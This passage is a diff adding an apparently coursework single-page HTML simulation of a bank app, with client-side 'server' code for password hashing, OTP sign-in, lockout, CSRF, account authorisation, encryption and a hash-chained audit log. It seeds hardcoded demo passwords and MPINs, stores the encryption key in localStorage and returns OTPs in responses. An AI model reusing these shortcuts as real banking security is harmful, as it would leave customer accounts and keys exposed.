@@ -1,0 +1,914 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Vittora Net Banking - secure online banking web application (Web Application Security, Assignment 4).">
+<style>:root{color-scheme:light}body{margin:0}img{max-width:100%}[hidden]{display:none!important}</style>
+<title>Vittora Net Banking</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Sora:wght@500;600;700&family=Source+Sans+3:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap">
+<style>
+/* Layout: navy sidebar + working canvas (stacks to a top bar on phones); saffron marks the one primary action per screen. */
+:root{
+  --bg:#f2f4f8; --surface:#ffffff; --raise:#f7f8fb; --ink:#111a2c; --muted:#5a6479; --line:#dbe0ea;
+  --side:#14213d; --side-ink:#dfe5f2; --side-muted:#8e9bb8; --side-hi:#22325a;
+  --primary:#1d3461; --primary-ink:#ffffff; --linkc:#1d3461; --saffron:#d9780f; --saffron-soft:#fcefdc;
+  --ok:#23784a; --ok-bg:#e0f2e8; --warn:#9a5d00; --warn-bg:#fcf0d9; --bad:#b4332a; --bad-bg:#fbe3e0;
+  --f-display:"Sora", "Segoe UI", system-ui, sans-serif;
+  --f-body:"Source Sans 3", "Segoe UI", system-ui, sans-serif;
+  --f-mono:"JetBrains Mono", ui-monospace, Menlo, Consolas, monospace;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --bg:#0b1020; --surface:#121a2e; --raise:#18223a; --ink:#e5e9f2; --muted:#98a2b8; --line:#263250;
+  --side:#0d1427; --side-ink:#dfe5f2; --side-muted:#7e8aa6; --side-hi:#1c2847;
+  --primary:#e8963a; --primary-ink:#1b1206; --linkc:#f0a54a; --saffron:#f0a54a; --saffron-soft:#3a2a12;
+  --ok:#62c48c; --ok-bg:#132c1f; --warn:#e9ad4c; --warn-bg:#33270e; --bad:#f2806f; --bad-bg:#3a1915; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --bg:#0b1020; --surface:#121a2e; --raise:#18223a; --ink:#e5e9f2; --muted:#98a2b8; --line:#263250;
+  --side:#0d1427; --side-ink:#dfe5f2; --side-muted:#7e8aa6; --side-hi:#1c2847;
+  --primary:#e8963a; --primary-ink:#1b1206; --linkc:#f0a54a; --saffron:#f0a54a; --saffron-soft:#3a2a12;
+  --ok:#62c48c; --ok-bg:#132c1f; --warn:#e9ad4c; --warn-bg:#33270e; --bad:#f2806f; --bad-bg:#3a1915; color-scheme:dark}
+
+*{box-sizing:border-box}
+html,body{min-height:100%}
+body{background:var(--bg);color:var(--ink);font-family:var(--f-body);font-size:16px;line-height:1.5}
+h1,h2,h3{font-family:var(--f-display);margin:0;line-height:1.2;text-wrap:balance}
+h1{font-size:1.6rem;font-weight:700;letter-spacing:-.01em}
+h2{font-size:1.2rem;font-weight:600}
+h3{font-size:1rem;font-weight:600}
+p{margin:0}
+.mono{font-family:var(--f-mono);font-size:.86em}
+.num{font-variant-numeric:tabular-nums}
+.muted{color:var(--muted)}
+.eyebrow{font-size:.72rem;text-transform:uppercase;letter-spacing:.1em;font-weight:700;color:var(--muted)}
+.small{font-size:.86rem}
+
+/* shell */
+.shell{display:grid;grid-template-columns:240px minmax(0,1fr);min-height:100vh}
+aside.side{background:var(--side);color:var(--side-ink);padding-block:22px;padding-left:max(16px, env(safe-area-inset-left, 0px));padding-right:16px;display:flex;flex-direction:column;gap:22px;position:sticky;top:0;height:100vh}
+.logo{display:flex;align-items:center;gap:10px;font-family:var(--f-display);font-weight:700;font-size:1.15rem;padding-inline:6px}
+.logo small{display:block;font-family:var(--f-body);font-weight:500;font-size:.72rem;color:var(--side-muted);letter-spacing:.06em;text-transform:uppercase}
+nav.menu{display:grid;gap:2px}
+nav.menu button{all:unset;cursor:pointer;display:flex;align-items:center;gap:10px;padding:9px 10px;border-radius:8px;color:var(--side-muted);font-weight:500}
+nav.menu button:hover{color:var(--side-ink);background:var(--side-hi)}
+nav.menu button[aria-current="page"]{color:var(--side-ink);background:var(--side-hi);box-shadow:inset 3px 0 0 var(--saffron)}
+nav.menu button:focus-visible{outline:2px solid var(--saffron)}
+nav.menu .count{margin-left:auto;background:var(--saffron);color:#1b1206;font-size:.72rem;font-weight:700;border-radius:999px;padding:0 7px}
+.side-foot{margin-top:auto;font-size:.8rem;color:var(--side-muted);display:grid;gap:8px}
+.side-foot .who{color:var(--side-ink);font-weight:600}
+.side-foot .timer{font-family:var(--f-mono);font-size:.78rem}
+.side-btn{all:unset;cursor:pointer;color:var(--side-ink);border:1px solid var(--side-hi);border-radius:8px;padding:7px 10px;text-align:center;font-weight:600;font-size:.85rem}
+.side-btn:focus-visible{outline:2px solid var(--saffron)}
+main{padding-block:28px 56px;padding-left:max(16px, 3vw);padding-right:max(16px, env(safe-area-inset-right, 0px), 3vw);min-width:0}
+.page{max-width:1000px;display:grid;gap:22px}
+
+@media (max-width:860px){
+  .shell{grid-template-columns:minmax(0,1fr)}
+  aside.side{min-width:0}
+  aside.side{position:sticky;top:0;height:auto;z-index:5;flex-direction:row;flex-wrap:wrap;align-items:center;gap:10px;padding-block:10px;padding-right:max(16px, env(safe-area-inset-right, 0px))}
+  nav.menu{display:flex;overflow-x:auto;width:100%;order:3}
+  nav.menu button{white-space:nowrap}
+  .side-foot{margin:0 0 0 auto;display:flex;align-items:center;gap:10px}
+  .side-foot .who,.side-foot .hide-sm{display:none}
+}
+
+/* parts */
+.card{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:20px;min-width:0}
+.card > * + *{margin-top:12px}
+.cols{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:18px;align-items:start}
+.row{display:flex;gap:10px;align-items:center;flex-wrap:wrap}
+.between{justify-content:space-between}
+.stack{display:grid;gap:12px}
+label.f{display:grid;gap:5px;font-weight:600;font-size:.9rem}
+.hint{font-weight:400;font-size:.8rem;color:var(--muted)}
+input,select,textarea{font:inherit;color:var(--ink);background:var(--raise);border:1px solid var(--line);border-radius:8px;padding:10px 12px;width:100%}
+input:focus-visible,select:focus-visible,textarea:focus-visible,.btn:focus-visible,.link:focus-visible{outline:2px solid var(--saffron);outline-offset:2px}
+.btn{font:inherit;font-weight:700;border-radius:8px;padding:10px 18px;border:1px solid var(--primary);background:var(--primary);color:var(--primary-ink);cursor:pointer}
+.btn.alt{background:transparent;color:var(--ink);border-color:var(--line)}
+.btn.sm{padding:5px 11px;font-size:.84rem}
+.btn.bad{background:transparent;color:var(--bad);border-color:var(--bad)}
+.btn:disabled{opacity:.5;cursor:not-allowed}
+.link{background:none;border:0;padding:0;font:inherit;font-weight:600;color:var(--linkc);cursor:pointer;text-decoration:underline;text-underline-offset:3px}
+.note{border-radius:9px;padding:10px 13px;font-size:.9rem}
+.note.ok{background:var(--ok-bg);color:var(--ok)}
+.note.bad{background:var(--bad-bg);color:var(--bad)}
+.note.warn{background:var(--warn-bg);color:var(--warn)}
+.tag{display:inline-block;font-size:.74rem;font-weight:700;border-radius:999px;padding:1px 9px;white-space:nowrap}
+.t-ok{background:var(--ok-bg);color:var(--ok)} .t-warn{background:var(--warn-bg);color:var(--warn)} .t-bad{background:var(--bad-bg);color:var(--bad)}
+.code{font-family:var(--f-mono);font-size:.74rem;font-weight:500;border-radius:5px;padding:1px 6px}
+.c2{background:var(--ok-bg);color:var(--ok)} .c4{background:var(--warn-bg);color:var(--warn)} .c5{background:var(--bad-bg);color:var(--bad)}
+
+.tw{overflow-x:auto}
+table{border-collapse:collapse;width:100%;font-size:.9rem}
+th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-size:.72rem;text-transform:uppercase;letter-spacing:.08em;color:var(--muted);font-weight:700}
+td.r,th.r{text-align:right}
+.cr{color:var(--ok)}
+
+/* sign in */
+.signin{min-height:100vh;display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.1fr)}
+.signin .brandside{background:var(--side);color:var(--side-ink);padding:48px max(24px, env(safe-area-inset-left, 0px));display:flex;flex-direction:column;gap:20px;justify-content:space-between}
+.signin .brandside h1{font-size:2.1rem;max-width:14ch}
+.signin .brandside ul{margin:0;padding:0;list-style:none;display:grid;gap:10px;color:var(--side-muted);font-size:.95rem}
+.signin .brandside li::before{content:"";display:inline-block;width:8px;height:8px;border-radius:2px;background:var(--saffron);margin-right:10px;vertical-align:middle}
+.signin .formside{padding-block:48px;padding-left:max(16px, 5vw);padding-right:max(16px, env(safe-area-inset-right, 0px), 5vw);display:grid;align-content:center;gap:22px;max-width:620px}
+@media (max-width:860px){.signin{grid-template-columns:1fr}.signin .brandside{padding:28px max(16px, env(safe-area-inset-left, 0px))}.signin .brandside h1{font-size:1.6rem}}
+.steps{display:flex;gap:8px;list-style:none;margin:0;padding:0;font-size:.82rem;font-weight:600;color:var(--muted);flex-wrap:wrap}
+.steps li{display:flex;align-items:center;gap:6px}
+.steps li span{width:22px;height:22px;border-radius:50%;display:grid;place-items:center;border:1.5px solid var(--line);font-size:.75rem}
+.steps li.on{color:var(--ink)} .steps li.on span{border-color:var(--saffron);background:var(--saffron);color:#1b1206}
+.steps li.done span{border-color:var(--ok);color:var(--ok)}
+.steps li + li::before{content:"";width:18px;height:1.5px;background:var(--line)}
+.phrase{background:var(--saffron-soft);border:1px dashed var(--saffron);border-radius:10px;padding:12px 14px}
+.phrase strong{font-family:var(--f-display);font-size:1.05rem}
+.kbd{display:grid;grid-template-columns:repeat(10,1fr);gap:5px}
+.kbd button{font-family:var(--f-mono);font-size:.9rem;padding:7px 0;border-radius:6px;border:1px solid var(--line);background:var(--raise);color:var(--ink);cursor:pointer}
+.kbd button.wide{grid-column:span 2;font-family:var(--f-body);font-size:.8rem;font-weight:600}
+.testcreds td,.testcreds th{padding:5px 8px}
+
+/* accounts */
+.acc{display:grid;gap:6px;border-radius:12px;padding:18px;background:var(--surface);border:1px solid var(--line)}
+.acc .amt{font-family:var(--f-display);font-weight:700;font-size:1.55rem}
+.acc-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
+.kv{display:grid;grid-template-columns:auto 1fr;gap:7px 18px;font-size:.92rem;margin:0}
+.kv dt{color:var(--muted)} .kv dd{margin:0;overflow-wrap:anywhere}
+
+/* stepper for payments */
+.wiz{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;list-style:none;padding:0;margin:0}
+.wiz li{border-top:3px solid var(--line);padding-top:6px;font-size:.8rem;font-weight:600;color:var(--muted)}
+.wiz li.on{border-color:var(--saffron);color:var(--ink)}
+.wiz li.done{border-color:var(--ok);color:var(--ok)}
+.pin{display:flex;gap:10px}
+.pin input{width:52px;text-align:center;font-family:var(--f-mono);font-size:1.3rem;padding:10px 0}
+.receipt{border:1px dashed var(--line);border-radius:12px;padding:18px;background:var(--raise)}
+
+/* testing */
+.tests{display:grid;grid-template-columns:minmax(0,1.15fr) minmax(0,1fr);gap:18px;align-items:start}
+.tests > .card:last-child{position:sticky;top:20px}
+@media (max-width:980px){.tests{grid-template-columns:1fr}.tests > .card:last-child{position:static}}
+.test{display:grid;grid-template-columns:1fr auto;gap:4px 12px;padding:12px 0;border-bottom:1px solid var(--line)}
+.test:last-child{border-bottom:0}
+.test p{grid-column:1;font-size:.86rem;color:var(--muted)}
+.test .out{grid-column:1 / -1;font-size:.85rem}
+.log{font-family:var(--f-mono);font-size:.76rem;display:grid;gap:6px;max-height:540px;overflow:auto}
+.log div{display:grid;grid-template-columns:auto 1fr auto;gap:8px;padding:7px 9px;border-radius:7px;background:var(--raise);align-items:start}
+.log .p{overflow-wrap:anywhere}
+.log .n{grid-column:1 / -1;color:var(--muted);overflow-wrap:anywhere}
+
+/* architecture */
+.flow{display:flex;flex-wrap:wrap;gap:8px;align-items:stretch}
+.node{flex:1 1 128px;border:1px solid var(--line);border-radius:10px;padding:10px;background:var(--raise);font-size:.86rem;display:grid;gap:2px;min-width:0}
+.node.key{border-color:var(--saffron)}
+.arrow{display:flex;flex-direction:column;align-items:center;justify-content:center;min-width:44px;font-size:.68rem;color:var(--muted);text-align:center}
+.arrow::after{content:"→";font-size:1.2rem;color:var(--saffron);line-height:1}
+.pill{font-size:.8rem;border:1px dashed var(--line);border-radius:999px;padding:3px 10px}
+.matrix td:first-child{font-weight:700;white-space:nowrap}
+ul.list{margin:0;padding-left:18px} ul.list li{overflow-wrap:anywhere} ul.list li + li{margin-top:5px}
+@media (max-width:640px){.flow{flex-direction:column}.arrow{flex-direction:row;gap:8px;min-height:28px}.arrow::after{content:"↓"}.node{flex:none}}
+
+/* message notification */
+.msgbox{position:fixed;right:max(16px, env(safe-area-inset-right, 0px));bottom:calc(16px + env(safe-area-inset-bottom, 0px));width:min(330px, calc(100vw - 32px));background:var(--surface);color:var(--ink);border:1px solid var(--line);border-left:4px solid var(--saffron);border-radius:12px;padding:14px 16px;box-shadow:0 12px 32px rgba(10,16,32,.22);z-index:30;font-size:.9rem}
+.msgbox .code6{font-family:var(--f-mono);font-size:1.45rem;letter-spacing:.22em;margin:4px 0}
+.msgbox button{position:absolute;top:8px;right:10px;background:none;border:0;color:var(--muted);cursor:pointer;font-size:1rem}
+@media (prefers-reduced-motion: no-preference){.msgbox{animation:pop .25s ease-out}@keyframes pop{from{transform:translateY(10px);opacity:.3}to{transform:none;opacity:1}}}
+</style>
+</head>
+<body>
+<div id="root"></div>
+<div id="msg"></div>
+
+<script>
+"use strict";
+/* ============================== utilities ============================== */
+const te = new TextEncoder(), td = new TextDecoder();
+const b64 = buf => btoa(String.fromCharCode(...new Uint8Array(buf)));
+const unb64 = s => Uint8Array.from(atob(s), c => c.charCodeAt(0));
+const hex = buf => [...new Uint8Array(buf)].map(b => b.toString(16).padStart(2, "0")).join("");
+const rand = n => crypto.getRandomValues(new Uint8Array(n));
+const randHex = n => hex(rand(n));
+const sha256 = async s => hex(await crypto.subtle.digest("SHA-256", te.encode(s)));
+const esc = s => String(s ?? "").replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
+const inr = p => new Intl.NumberFormat("en-IN", {style:"currency", currency:"INR"}).format(p / 100);
+const when = ts => new Date(ts).toLocaleString("en-IN", {day:"2-digit", month:"short", year:"numeric", hour:"2-digit", minute:"2-digit"});
+const mask = n => "XX" + String(n).slice(-4);
+const mmss = ms => { const s = Math.max(0, Math.ceil(ms / 1000)); return Math.floor(s / 60) + ":" + String(s % 60).padStart(2, "0"); };
+const store = {
+  get(k){ try { return localStorage.getItem(k); } catch { return null; } },
+  set(k, v){ try { localStorage.setItem(k, v); } catch {} },
+  del(k){ try { localStorage.removeItem(k); } catch {} }
+};
+const $ = id => document.getElementById(id);
+
+/* ============================== configuration ============================== */
+const CONFIG = Object.freeze({
+  PBKDF2_ITERATIONS: 150000,
+  LOCKOUT_THRESHOLD: 5, LOCKOUT_MS: 60000,
+  OTP_TTL_MS: 120000, OTP_MAX_TRIES: 3,
+  IDLE_TIMEOUT_MS: 180000, ABSOLUTE_TIMEOUT_MS: 900000,
+  QUOTE_TTL_MS: 180000,
+  MPIN_MAX_TRIES: 3,
+  PAYEE_COOLING_MS: 60000,
+  APPROVAL_THRESHOLD: 50000_00, PER_TXN_LIMIT: 200000_00, DAILY_LIMIT: 300000_00,
+  DEBUG: false
+});
+const RULES = {
+  custid: /^[a-z][a-z0-9_]{2,19}$/, otp: /^\d{6}$/, mpin: /^\d{4}$/,
+  amount: /^\d{1,7}(\.\d{1,2})?$/, remark: /^[A-Za-z0-9 .,\-\/]{0,40}$/,
+  name: /^[A-Za-z][A-Za-z .]{1,39}$/, accno: /^\d{9,18}$/, ifsc: /^[A-Z]{4}0[A-Z0-9]{6}$/,
+  reason: /^[A-Za-z0-9 .,\-]{3,80}$/
+};
+
+/* ============================== server tier ==============================
+   Only the methods on `Bank` are reachable from the interface. Each one
+   validates input, authenticates the session, authorises the role and the
+   object, and writes to the audit trail. */
+const Bank = (() => {
+  const DBK = "vittora-core-v1", KMK = "vittora-kms-v1";
+  let db, dataKey, macKey;
+  const sessions = new Map(), mfa = new Map(), payeeOtps = new Map(), spent = new Set(), reqs = [], subs = new Set();
+  class HttpError extends Error { constructor(s, m){ super(m); this.status = s; } }
+
+  async function keys(){
+    let raw = store.get(KMK); if (!raw){ raw = b64(rand(32)); store.set(KMK, raw); }
+    dataKey = await crypto.subtle.importKey("raw", unb64(raw), "AES-GCM", false, ["encrypt", "decrypt"]);
+    macKey = await crypto.subtle.generateKey({name:"HMAC", hash:"SHA-256"}, false, ["sign", "verify"]);
+  }
+  const enc = async t => { const iv = rand(12); return {iv: b64(iv), ct: b64(await crypto.subtle.encrypt({name:"AES-GCM", iv}, dataKey, te.encode(t)))}; };
+  const dec = async o => td.decode(await crypto.subtle.decrypt({name:"AES-GCM", iv: unb64(o.iv)}, dataKey, unb64(o.ct)));
+  async function kdf(secret, salt){
+    const k = await crypto.subtle.importKey("raw", te.encode(secret), "PBKDF2", false, ["deriveBits"]);
+    return b64(await crypto.subtle.deriveBits({name:"PBKDF2", hash:"SHA-256", salt: unb64(salt), iterations: CONFIG.PBKDF2_ITERATIONS}, k, 256));
+  }
+  const sign = async s => b64(await crypto.subtle.sign("HMAC", macKey, te.encode(s)));
+  const verify = async (s, sig) => { try { return await crypto.subtle.verify("HMAC", macKey, unb64(sig), te.encode(s)); } catch { return false; } };
+  const same = (a, b) => { if (a.length !== b.length) return false; let r = 0; for (let i = 0; i < a.length; i++) r |= a.charCodeAt(i) ^ b.charCodeAt(i); return r === 0; };
+  const save = () => store.set(DBK, JSON.stringify(db));
+  const otp6 = () => String(crypto.getRandomValues(new Uint32Array(1))[0] % 1e6).padStart(6, "0");
+
+  async function seed(){
+    const user = async (id, name, role, pw, phrase, mpin, mobile) => {
+      const salt = b64(rand(16)), msalt = b64(rand(16));
+      return {id, name, role, salt, hash: await kdf(pw, salt), phrase, mobile, msalt, mhash: mpin ? await kdf(mpin, msalt) : null, failed: 0, lockUntil: 0, lastLogin: null};
+    };
+    db = {users: {
+        aditya: await user("aditya", "Aditya Pradhan", "customer", "Aditya@123", "Monsoon over Lonavala", "2580", "7710"),
+        priya: await user("priya", "Priya Nair", "customer", "Priya@123", "Blue door in Kochi", "1470", "4402"),
+        officer: await user("officer", "R. Kulkarni", "officer", "Officer@123", "Chai at four", null, "9031")},
+      accounts: {}, payees: {aditya: [], priya: []}, txns: [], pending: [], audit: [], daily: {}};
+    const acc = async (id, owner, type, no, rupees) => db.accounts[id] = {id, owner, type, noEnc: await enc(no), last4: no.slice(-4), ifsc: "VTRB0002417", balance: rupees * 100, hold: 0};
+    await acc("S1", "aditya", "Savings", "302104578812", 84250);
+    await acc("C1", "aditya", "Current", "302209931145", 312700);
+    await acc("S2", "priya", "Savings", "302107766203", 46980);
+    db.payees.aditya.push({id: "PY" + randHex(2), name: "Priya Nair", accEnc: await enc("302107766203"), last4: "6203", ifsc: "VTRB0002417", internal: "S2", activeAt: 0});
+    const base = Date.now() - 7 * 864e5;
+    [["S1","CR",6500000,"Salary October",0],["S1","DR",1850000,"House rent",1],["S1","DR",249900,"MSEB electricity",3],["C1","CR",12000000,"Invoice 2026-114",2],["S2","CR",3000000,"Stipend",1]]
+      .forEach(([a, d, p, r, k]) => db.txns.push({ref: "VT" + randHex(4).toUpperCase(), acc: a, dir: d, amount: p, remark: r, ts: base + k * 864e5}));
+    await audit("system", "SYSTEM_INITIALISED", "ok", "core banking records created"); save();
+  }
+  async function init(){
+    await keys();
+    const raw = store.get(DBK);
+    if (raw){ try { db = JSON.parse(raw); await dec(Object.values(db.accounts)[0].noEnc); } catch { db = null; } }
+    if (!db) await seed();
+  }
+
+  async function audit(actor, event, outcome, detail){
+    const prev = db.audit.length ? db.audit[db.audit.length - 1].hash : "GENESIS";
+    const e = {seq: db.audit.length + 1, ts: Date.now(), actor, event, outcome, detail: String(detail).slice(0, 300), prev};
+    e.hash = await sha256([e.prev, e.seq, e.ts, e.actor, e.event, e.outcome, e.detail].join("|"));
+    db.audit.push(e); save();
+  }
+  async function chain(){
+    let prev = "GENESIS";
+    for (const e of db.audit){
+      if (e.prev !== prev || await sha256([prev, e.seq, e.ts, e.actor, e.event, e.outcome, e.detail].join("|")) !== e.hash) return {ok: false, at: e.seq};
+      prev = e.hash;
+    }
+    return {ok: true, count: db.audit.length};
+  }
+
+  const valid = (v, rule, msg) => { if (typeof v !== "string" || !RULES[rule].test(v)) throw new HttpError(400, msg); };
+  async function authn(sid){
+    const s = typeof sid === "string" && sessions.get(sid);
+    if (!s) throw new HttpError(401, "Your session is not valid. Please sign in again.");
+    const now = Date.now();
+    if (now - s.seen > CONFIG.IDLE_TIMEOUT_MS || now - s.born > CONFIG.ABSOLUTE_TIMEOUT_MS){
+      sessions.delete(sid); await audit(s.user, "SESSION_EXPIRED", "info", now - s.born > CONFIG.ABSOLUTE_TIMEOUT_MS ? "absolute limit" : "idle limit");
+      throw new HttpError(401, "You were signed out because the session timed out.");
+    }
+    s.seen = now; return s;
+  }
+  const role = (s, ...r) => { if (!r.includes(db.users[s.user].role)) throw new HttpError(403, "Your role is not allowed to do this."); };
+  const csrf = (s, t) => { if (typeof t !== "string" || !same(t, s.csrf)) throw new HttpError(403, "Request refused: anti-forgery token missing or wrong."); };
+  const mine = (s, id) => { const a = db.accounts[id]; if (!a || a.owner !== s.user) throw new HttpError(403, "That account does not belong to you."); return a; };
+
+  async function call(method, path, sid, fn, ok){
+    const t = performance.now(); let status = 200, data = null, error = null;
+    const actor = (typeof sid === "string" && sessions.get(sid)?.user) || "anonymous";
+    try { data = await fn(); }
+    catch (e){
+      if (e instanceof HttpError){ status = e.status; error = e.message; }
+      else { status = 500; const ref = "INC-" + randHex(3).toUpperCase(); error = `We could not complete this request. Reference ${ref}.`; await audit(actor, "UNHANDLED_EXCEPTION", "error", `${ref} ${e.name}: ${e.message}`); }
+      if (status === 400 || status === 403 || status === 409) await audit(actor, "REQUEST_REFUSED", "denied", `${method} ${path} ${status}: ${error}`);
+    }
+    reqs.unshift({ts: Date.now(), method, path, status, ms: Math.round(performance.now() - t), note: error || ok || ""}); reqs.length = Math.min(reqs.length, 40);
+    subs.forEach(f => f());
+    return {status, data, error};
+  }
+
+  async function payeeIsActive(s, id){
+    const p = (db.payees[s.user] || []).find(p => p.id === id);
+    if (!p) throw new HttpError(403, "Unknown payee.");
+    if (p.activeAt > Date.now()) throw new HttpError(400, `This payee becomes active in ${mmss(p.activeAt - Date.now())}. New payees have a cooling period.`);
+    return p;
+  }
+  function settle(q, s){
+    const from = db.accounts[q.from], ref = q.ref, ts = Date.now();
+    from.balance -= q.amount;
+    db.txns.push({ref, acc: from.id, dir: "DR", amount: q.amount, remark: q.remark || "Fund transfer", ts});
+    const credit = db.accounts[q.to]?.id || (db.payees[q.user] || []).find(p => p.id === q.to)?.internal;
+    if (credit){ db.accounts[credit].balance += q.amount; db.txns.push({ref, acc: credit, dir: "CR", amount: q.amount, remark: q.remark || "Fund transfer received", ts}); }
+  }
+
+  return {
+    init, requests: () => reqs.slice(), subscribe: f => subs.add(f),
+    session: sid => { const s = sessions.get(sid); return s ? {born: s.born, seen: s.seen} : null; },
+
+    // Step 1 of sign-in: show the customer's personal phrase (site-to-user authentication).
+    phrase(id){
+      return call("POST", "/signin/identify", null, async () => {
+        valid(id, "custid", "Customer ID must be 3 to 20 lowercase letters, digits or _.");
+        const u = db.users[id];
+        if (u) return {phrase: u.phrase};
+        const words = ["Amber kite", "Quiet harbour", "Green lantern", "Old banyan", "Rain on tin", "Paper boat"];
+        return {phrase: words[parseInt((await sha256("decoy|" + id)).slice(0, 2), 16) % words.length]};   // same answer every time, so IDs cannot be enumerated
+      }, "phrase shown");
+    },
+
+    signin(id, pw){
+      return call("POST", "/signin/password", null, async () => {
+        valid(id, "custid", "Customer ID or password is incorrect.");
+        if (typeof pw !== "string" || pw.length < 8 || pw.length > 64) throw new HttpError(401, "Customer ID or password is incorrect.");
+        const u = db.users[id];
+        if (u && u.lockUntil > Date.now()){ await audit(id, "SIGNIN_WHILE_LOCKED", "denied", "blocked"); throw new HttpError(429, `Access is locked after repeated failures. Try again in ${mmss(u.lockUntil - Date.now())} or contact your branch.`); }
+        const h = await kdf(pw, u ? u.salt : "AAAAAAAAAAAAAAAAAAAAAA==");
+        if (!u || !same(h, u.hash)){
+          if (u){ if (++u.failed >= CONFIG.LOCKOUT_THRESHOLD){ u.failed = 0; u.lockUntil = Date.now() + CONFIG.LOCKOUT_MS; await audit(id, "ACCESS_LOCKED", "denied", `${CONFIG.LOCKOUT_THRESHOLD} wrong passwords`); } save(); }
+          await audit(u ? id : "unknown", "SIGNIN_FAILED", "denied", "wrong credentials");
+          throw new HttpError(401, "Customer ID or password is incorrect.");
+        }
+        u.failed = 0; save();
+        const code = otp6(), token = randHex(16);
+        mfa.set(token, {user: id, h: await sha256(code + token), exp: Date.now() + CONFIG.OTP_TTL_MS, tries: 0});
+        await audit(id, "OTP_SENT", "ok", `to mobile XXXXXX${u.mobile}`);
+        return {token, delivered: code, mobile: u.mobile};
+      }, "password verified, OTP sent");
+    },
+
+    otp(token, code){
+      return call("POST", "/signin/otp", null, async () => {
+        const m = mfa.get(token); if (!m) throw new HttpError(401, "This sign-in has expired. Start again.");
+        valid(code, "otp", "Enter the 6-digit OTP.");
+        if (Date.now() > m.exp){ mfa.delete(token); throw new HttpError(401, "The OTP has expired. Start again."); }
+        if (!same(await sha256(code + token), m.h)){
+          await audit(m.user, "OTP_FAILED", "denied", `attempt ${++m.tries}`);
+          if (m.tries >= CONFIG.OTP_MAX_TRIES){ mfa.delete(token); throw new HttpError(401, "Too many wrong OTPs. Start again."); }
+          throw new HttpError(401, `Wrong OTP. ${CONFIG.OTP_MAX_TRIES - m.tries} attempts left.`);
+        }
+        mfa.delete(token);
+        const u = db.users[m.user], prevLogin = u.lastLogin;
+        u.lastLogin = Date.now(); save();
+        const sid = randHex(16), now = Date.now();
+        sessions.set(sid, {user: m.user, born: now, seen: now, csrf: randHex(16), mpinFails: 0});
+        await audit(m.user, "SIGNIN_SUCCESS", "ok", `session ${sid.slice(0, 6)}…`);
+        return {sid, csrf: sessions.get(sid).csrf, user: {id: u.id, name: u.name, role: u.role}, prevLogin};
+      }, "OTP verified, new session issued");
+    },
+
+    signout(sid){ return call("POST", "/signout", sid, async () => { const s = sessions.get(sid); if (s){ sessions.delete(sid); await audit(s.user, "SIGNOUT", "ok", "session destroyed"); } return true; }, "session destroyed"); },
+
+    overview(sid){
+      return call("GET", "/overview", sid, async () => {
+        const s = await authn(sid); role(s, "customer");
+        const accounts = Object.values(db.accounts).filter(a => a.owner === s.user).map(a => ({id: a.id, type: a.type, masked: mask(a.last4), ifsc: a.ifsc, balance: a.balance, available: a.balance - a.hold}));
+        const ids = accounts.map(a => a.id);
+        return {accounts, recent: db.txns.filter(t => ids.includes(t.acc)).sort((a, b) => b.ts - a.ts).slice(0, 6),
+          pending: db.pending.filter(p => p.user === s.user).slice(-5).reverse()};
+      });
+    },
+    statement(sid, id){
+      return call("GET", `/accounts/${id}/transactions`, sid, async () => {
+        const s = await authn(sid); role(s, "customer"); const a = mine(s, id);
+        return {account: {type: a.type, masked: mask(a.last4)}, txns: db.txns.filter(t => t.acc === id).sort((x, y) => y.ts - x.ts)};
+      });
+    },
+    reveal(sid, id, token){
+      return call("POST", `/accounts/${id}/reveal`, sid, async () => {
+        const s = await authn(sid); role(s, "customer"); csrf(s, token); const a = mine(s, id);
+        await audit(s.user, "ACCOUNT_NUMBER_VIEWED", "ok", `account ${mask(a.last4)}`);
+        return dec(a.noEnc);
+      }, "decrypted, view recorded");
+    },
+
+    payees(sid){
+      return call("GET", "/payees", sid, async () => {
+        const s = await authn(sid); role(s, "customer");
+        return (db.payees[s.user] || []).map(p => ({id: p.id, name: p.name, masked: mask(p.last4), ifsc: p.ifsc, activeAt: p.activeAt}));
+      });
+    },
+    payeeStart(sid, b, token){
+      return call("POST", "/payees", sid, async () => {
+        const s = await authn(sid); role(s, "customer"); csrf(s, token);
+        valid(b.name, "name", "Payee name can contain only letters, spaces and dots.");
+        valid(b.accno, "accno", "Account number must be 9 to 18 digits.");
+        valid(b.ifsc, "ifsc", "IFSC must look like ABCD0123456.");
+        if ((db.payees[s.user] || []).length >= 12) throw new HttpError(400, "You can save up to 12 payees.");
+        const code = otp6(), t = randHex(12);
+        payeeOtps.set(t, {user: s.user, b, h: await sha256(code + t), exp: Date.now() + CONFIG.OTP_TTL_MS, tries: 0});
+        await audit(s.user, "PAYEE_OTP_SENT", "ok", `${b.name} ${mask(b.accno)}`);
+        return {t, delivered: code, mobile: db.users[s.user].mobile};
+      }, "details valid, OTP sent");
+    },
+    payeeConfirm(sid, t, code, token){
+      return call("POST", "/payees/confirm", sid, async () => {
+        const s = await authn(sid); role(s, "customer"); csrf(s, token);
+        const p = payeeOtps.get(t); if (!p || p.user !== s.user) throw new HttpError(400, "This request has expired. Add the payee again.");
+        valid(code, "otp", "Enter the 6-digit OTP.");
+        if (Date.now() > p.exp || !same(await sha256(code + t), p.h)){ if (++p.tries >= CONFIG.OTP_MAX_TRIES) payeeOtps.delete(t); throw new HttpError(400, "Wrong or expired OTP."); }
+        payeeOtps.delete(t);
+        let internal = null;
+        for (const a of Object.values(db.accounts)) if (a.ifsc === p.b.ifsc && await dec(a.noEnc) === p.b.accno) internal = a.id;
+        if (internal && db.accounts[internal].owner === s.user) throw new HttpError(400, "That is your own account. Pick it directly when paying.");
